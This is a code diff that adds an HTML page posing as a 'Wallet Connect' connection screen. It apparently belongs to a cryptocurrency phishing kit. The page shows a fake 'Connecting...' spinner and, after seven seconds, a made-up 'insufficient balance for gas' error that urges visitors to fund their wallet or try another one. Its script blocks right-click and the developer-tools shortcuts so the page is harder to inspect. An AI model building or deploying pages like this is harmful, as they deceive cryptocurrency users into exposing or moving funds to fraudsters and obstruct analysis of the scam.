@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WALLET CONNECT</title>
+    <link rel="icon" href="images/blank.png">
+</head>
+<body>
+    <div class="loader">
+        <img src="images/blank.png" alt="Walletconnect image" draggable="false">
+    </div>
+    <h3>Connecting...</h3>
+    <style>
+         #message {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: large;
+        }
+        h3{
+            text-align: center;
+            margin-top: 300px;
+            padding-left: 25px;
+            color: white;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            font-weight: lighter;
+        }
+
+        body{
+            background-color: rgb(17, 17, 48);
+        }
+    img {
+ position: absolute;
+ top: 25%;
+ left: 50%;
+ margin-top: -50px;
+ margin-left: -50px;
+ width: 100px;
+ height: 100px;
+ border: 5px solid #f3f3f3;
+ border-top: 5px solid #ffffff;
+ border-radius: 50%;
+ animation: spin 2s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+@media (max-width: 768px) {
+ .img {
+    margin-top: -25px;
+    margin-left: -25px;
+    width: 50px;
+    height: 50px;
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid #ffffff;
+ }
+}
+#button-container {
+            display: none;
+            text-align: center; /* Center the button inside the container div */
+            margin-top: 20px;
+        }
+ </style>
+ <div id="message">Insufficient balance for gas, fund your wallet to continue or try again with another Wallet.</div>
+ <div id="button-container">
+    <button style="height: 50px; width: 80px;" id="backButton" onclick="goBack()">Go Back</button>
+</div>
+
+<script>
+    // Function to display the message and button after 30 seconds
+    setTimeout(function() {
+        document.getElementById('message').style.display = 'block';
+        document.getElementById('button-container').style.display = 'block';
+    }, 7000);
+
+    // Function to navigate to the previous page
+    function goBack() {
+        window.history.back();
+    }
+    if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+}else{
+    window.oncontextmenu = function () {
+        return false;
+    }
+}
+$(document).keydown(function (event) {
+    if (event.keyCode == 123) {
+        return false;
+    }
+    else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
+        return false;
+    }
+});
+</script>
+</body>
+</html>
